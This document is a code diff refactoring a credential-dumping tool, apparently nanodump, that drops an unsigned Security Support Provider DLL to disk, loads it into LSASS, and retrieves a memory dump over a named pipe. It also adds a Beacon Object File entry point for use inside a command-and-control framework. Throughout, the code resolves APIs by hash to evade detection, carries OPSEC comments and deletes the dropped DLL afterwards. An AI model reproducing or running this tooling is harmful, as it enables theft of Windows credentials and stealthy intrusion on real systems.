@@ -33,12 +33,12 @@ DWORD WINAPI load_ssp(LPVOID Parameter)
 #if !defined(PASS_PARAMS_VIA_NAMED_PIPES) || PASS_PARAMS_VIA_NAMED_PIPES == 0
     if (status == SEC_E_SECPKG_NOT_FOUND)
     {
-        PRINT("Done, status: SEC_E_SECPKG_NOT_FOUND, this is normal if DllMain returns FALSE\n");
+        PRINT("Done, status: SEC_E_SECPKG_NOT_FOUND, this is normal if DllMain returns FALSE");
         return 0;
     }
     else
     {
-        PRINT("Done, status: 0x%lx\n", status);
+        PRINT("Done, status: 0x%lx", status);
         return 1;
     }
 #else
@@ -55,6 +55,138 @@ DWORD WINAPI load_ssp(LPVOID Parameter)
 #endif
 }
 
+BOOL write_dll(
+    IN unsigned char nanodump_ssp_dll[],
+    IN unsigned int nanodump_ssp_dll_len,
+    IN LPSTR write_dll_path,
+    IN LPSTR load_path,
+    OUT LPSTR* random_dll_path)
+{
+    BOOL ret_val = FALSE;
+    BOOL success = FALSE;
+
+    // if the user did not specify a pre-existing DLL, write our own
+    if (!load_path)
+    {
+        // fair OPSEC warning
+        PRINT_ERR("[!] Writing an unsigned DLL to disk");
+
+        if (!write_dll_path)
+        {
+            success = generate_random_dll_path(random_dll_path);
+            if (!success)
+                goto cleanup;
+
+            write_dll_path = *random_dll_path;
+
+            DPRINT("generated random dll path: %s", write_dll_path);
+        }
+
+        success = write_ssp_dll(
+            write_dll_path,
+            nanodump_ssp_dll,
+            nanodump_ssp_dll_len);
+        if (!success)
+            goto cleanup;
+    }
+
+    ret_val = TRUE;
+
+cleanup:
+    return ret_val;
+}
+
+VOID run_technique(
+    IN unsigned char nanodump_ssp_dll[],
+    IN unsigned int nanodump_ssp_dll_len,
+    IN LPSTR write_dll_path,
+    IN LPSTR load_path,
+    IN LPSTR dump_path,
+    IN BOOL use_valid_sig)
+{
+    BOOL  success         = FALSE;
+    LPSTR random_dll_path = NULL;
+    LPSTR final_path      = NULL;
+
+    // first of all, write the SSP DLL in the filesystem
+
+    success = write_dll(
+        nanodump_ssp_dll,
+        nanodump_ssp_dll_len,
+        write_dll_path,
+        load_path,
+        &random_dll_path);
+    if (!success)
+        goto cleanup;
+
+    if (write_dll_path)
+        final_path = write_dll_path;
+    else if (load_path)
+        final_path = load_path;
+    else
+        final_path = random_dll_path;
+
+#if !defined(PASS_PARAMS_VIA_NAMED_PIPES) || PASS_PARAMS_VIA_NAMED_PIPES == 0
+    // if we are not going to pass parameters to the DLL, simply load it and exit
+    load_ssp(final_path);
+#else
+    // we are going to pass parametesr to the DLL, so we will load it on a separate thread and
+    // pass the parameters via a named pipe
+
+    BOOL   dump_worked = FALSE;
+    HANDLE hThread     = NULL;
+    DWORD  dwThreadId  = 0;
+
+    CreateThread_t CreateThread = NULL;
+
+    CreateThread = (CreateThread_t)(ULONG_PTR)get_function_address(
+        get_library_address(KERNEL32_DLL, TRUE),
+        CreateThread_SW2_HASH,
+        0);
+    if (!CreateThread)
+    {
+        api_not_found("CreateThread");
+        goto cleanup;
+    }
+
+
+    // load the SSP library in a thread because it will lock otherwise
+    hThread = CreateThread(NULL, 0, load_ssp, final_path, 0, &dwThreadId);
+
+    success = send_parameters_and_get_result(
+        dump_path,
+        use_valid_sig,
+        &dump_worked);
+    if (!success)
+        goto cleanup;
+
+    if (dump_worked)
+    {
+        print_success(
+            dump_path,
+            use_valid_sig,
+            TRUE);
+    }
+    else
+    {
+        PRINT_ERR("The dump was not created");
+    }
+#endif
+
+cleanup:
+#if PASS_PARAMS_VIA_NAMED_PIPES == 1
+    if (hThread)
+        NtClose(hThread);
+#endif
+    if (write_dll_path)
+        delete_file(write_dll_path);
+    if (random_dll_path)
+    {
+        delete_file(random_dll_path);
+        intFree(random_dll_path);
+    }
+}
+
 #if defined(BOF)
 
 #include "utils.c"
@@ -67,14 +199,34 @@ DWORD WINAPI load_ssp(LPVOID Parameter)
 
 void go(char* args, int length)
 {
-    datap  parser;
-    LPSTR ssp_path;
+    datap          parser               = { 0 };
+    unsigned char* nanodump_ssp_dll     = NULL;
+    int            nanodump_ssp_dll_len = 0;
+    LPSTR          write_dll_path       = NULL;
+    LPSTR          load_path            = NULL;
+    LPSTR          dump_path            = NULL;
+    BOOL           use_valid_sig        = FALSE;
 
     BeaconDataParse(&parser, args, length);
-    ssp_path = BeaconDataExtract(&parser, NULL);
+    nanodump_ssp_dll = (unsigned char*)BeaconDataExtract(&parser, &nanodump_ssp_dll_len);
+    write_dll_path = BeaconDataExtract(&parser, NULL);
+    load_path = BeaconDataExtract(&parser, NULL);
+#if PASS_PARAMS_VIA_NAMED_PIPES == 1
+    /*
+     * only parse parameters if PASS_PARAMS_VIA_NAMED_PIPES is enabled
+     * if not, the hardcoded options in NanoDumpSSP will be used
+     */
+    dump_path = BeaconDataExtract(&parser, NULL);
+    use_valid_sig = (BOOL)BeaconDataInt(&parser);
+#endif
 
-    // TODO: adapt
-    load_ssp(ssp_path);
+    run_technique(
+        nanodump_ssp_dll,
+        nanodump_ssp_dll_len,
+        write_dll_path,
+        load_path,
+        dump_path,
+        use_valid_sig);
 }
 
 #endif
@@ -109,39 +261,10 @@ void usage(char* procname)
 
 int main(int argc, char* argv[])
 {
-    BOOL           success          = FALSE;
-    BOOL           dump_worked      = FALSE;
-    LPSTR          dump_path        = NULL;
-    BOOL           use_valid_sig    = FALSE;
-    LPSTR          write_dll_path   = NULL;
-    LPSTR          load_path        = NULL;
-    BOOL           used_random_path = FALSE;
-    HANDLE         hPipe            = NULL;
-    HANDLE         hThread          = NULL;
-    DWORD          dwThreadId       = 0;
-
-    Sleep_t        Sleep        = NULL;
-    CreateThread_t CreateThread = NULL;
-
-    Sleep = (Sleep_t)(ULONG_PTR)get_function_address(
-        get_library_address(KERNEL32_DLL, TRUE),
-        Sleep_SW2_HASH,
-        0);
-    if (!Sleep)
-    {
-        api_not_found("Sleep");
-        goto cleanup;
-    }
-
-    CreateThread = (CreateThread_t)(ULONG_PTR)get_function_address(
-        get_library_address(KERNEL32_DLL, TRUE),
-        CreateThread_SW2_HASH,
-        0);
-    if (!CreateThread)
-    {
-        api_not_found("CreateThread");
-        goto cleanup;
-    }
+    LPSTR dump_path        = NULL;
+    BOOL  use_valid_sig    = FALSE;
+    LPSTR write_dll_path   = NULL;
+    LPSTR load_path        = NULL;
 
     for (int i = 1; i < argc; ++i)
     {
@@ -211,87 +334,13 @@ int main(int argc, char* argv[])
         return 0;
     }
 
-    // if the user did not specify a pre-existing DLL, write our own
-    if (!load_path)
-    {
-        // fair OPSEC warning
-        PRINT_ERR("[!] Writing an unsigned DLL to disk");
-
-        if (!write_dll_path)
-        {
-            used_random_path = TRUE;
-
-            success = generate_random_dll_path(&write_dll_path);
-            if (!success)
-                goto cleanup;
-
-            DPRINT("generated random dll path: %s", write_dll_path);
-        }
-
-        success = write_ssp_dll(
-            write_dll_path,
-            nanodump_ssp_dll,
-            nanodump_ssp_dll_len);
-        if (!success)
-            goto cleanup;
-    }
-
-    // load the SSP library in a thread because it will lock otherwise
-    hThread = CreateThread(NULL, 0, load_ssp, write_dll_path ? write_dll_path : load_path, 0, &dwThreadId);
-
-    for (int i = 0; i < 5; ++i)
-    {
-        // let's try to connect to the named pipe
-        success = client_connect_to_named_pipe(
-            IPC_PIPE_NAME,
-            &hPipe);
-        if (!success)
-        {
-            // sleep half a second and try again
-            if (i != 4)
-            {
-                DPRINT("could not connnect to the named pipe, sleeping and trying again...");
-            }
-            Sleep(500);
-            continue;
-        }
-
-        DPRINT("connnected to the named pipe");
-
-        success = client_send_arguments_from_pipe(
-            hPipe,
-            dump_path,
-            use_valid_sig,
-            FALSE);
-        if (!success)
-            goto cleanup;
-
-        success = client_recv_success(
-            hPipe,
-            &dump_worked);
-        if (success && dump_worked)
-        {
-            print_success(
-                dump_path,
-                use_valid_sig,
-                TRUE);
-            goto cleanup;
-        }
-        else
-            break;
-    }
-
-    PRINT_ERR("The dump was not created");
-
-cleanup:
-    if (hPipe)
-        NtClose(hPipe);
-    if (write_dll_path)
-        delete_file(write_dll_path);
-    if (used_random_path && write_dll_path)
-        intFree(write_dll_path);
-    if (hThread)
-        NtClose(hThread);
+    run_technique(
+        nanodump_ssp_dll,
+        nanodump_ssp_dll_len,
+        write_dll_path,
+        load_path,
+        dump_path,
+        use_valid_sig);
 
     return 0;
 }
@@ -313,10 +362,8 @@ void usage(char* procname)
 
 int main(int argc, char* argv[])
 {
-    BOOL           success          = FALSE;
-    LPSTR          write_dll_path   = NULL;
-    LPSTR          load_path        = NULL;
-    BOOL           used_random_path = FALSE;
+    LPSTR write_dll_path   = NULL;
+    LPSTR load_path        = NULL;
 
     for (int i = 1; i < argc; ++i)
     {
@@ -359,39 +406,13 @@ int main(int argc, char* argv[])
         return 0;
     }
 
-    // if the user did not specify a pre-existing DLL, write our own
-    if (!load_path)
-    {
-        // fair OPSEC warning
-        PRINT_ERR("[!] Writing an unsigned DLL to disk");
-
-        if (!write_dll_path)
-        {
-            used_random_path = TRUE;
-
-            success = generate_random_dll_path(&write_dll_path);
-            if (!success)
-                goto cleanup;
-
-            DPRINT("generated random dll path: %s", write_dll_path);
-        }
-
-        success = write_ssp_dll(
-            write_dll_path,
-            nanodump_ssp_dll,
-            nanodump_ssp_dll_len);
-        if (!success)
-            goto cleanup;
-    }
-
-    // load the SSP library
-    load_ssp(write_dll_path ? write_dll_path : load_path);
-
-cleanup:
-    if (write_dll_path)
-        delete_file(write_dll_path);
-    if (used_random_path && write_dll_path)
-        intFree(write_dll_path);
+    run_technique(
+        nanodump_ssp_dll,
+        nanodump_ssp_dll_len,
+        write_dll_path,
+        load_path,
+        NULL,
+        FALSE);
 
     return 0;
 }
